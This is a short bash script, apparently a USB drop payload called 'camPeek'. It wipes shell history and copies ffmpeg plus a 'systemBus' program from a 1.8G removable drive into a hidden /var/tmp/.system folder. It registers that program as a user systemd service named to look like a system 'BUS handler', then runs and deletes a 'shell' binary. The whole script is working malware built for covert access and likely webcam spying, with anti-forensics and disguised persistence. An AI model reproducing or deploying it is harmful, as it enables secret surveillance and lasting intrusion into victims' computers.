#!/bin/bash
unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
mkdir /var/tmp/.system
lol=$(lsblk | grep 1.8G)
disk=$(echo $lol | awk '{print $1}')
mntt=$(lsblk | grep $disk | awk '{print $7}')
cp -r $mntt/payloads/library/camPeek/ffmpeg /var/tmp/.system/
chmod +x /var/tmp/.system/ffmpeg
mkdir /var/tmp/.system/sysLog
cp -r $mntt/payloads/library/camPeek/systemBus /var/tmp/.system/systemBus
chmod +x /var/tmp/.system/systemBus
mkdir -p ~/.config/systemd/user
echo -e "[Unit]\nDescription= System BUS handler\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/systemBus -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/systemBUS.service
systemctl --user daemon-reload
systemctl --user enable --now systemBUS.service
systemctl --user start --now systemBUS.service
cp -r $mntt/payloads/library/camPeek/shell /tmp/
chmod +x /tmp/shell && /tmp/./shell && rm /tmp/shell
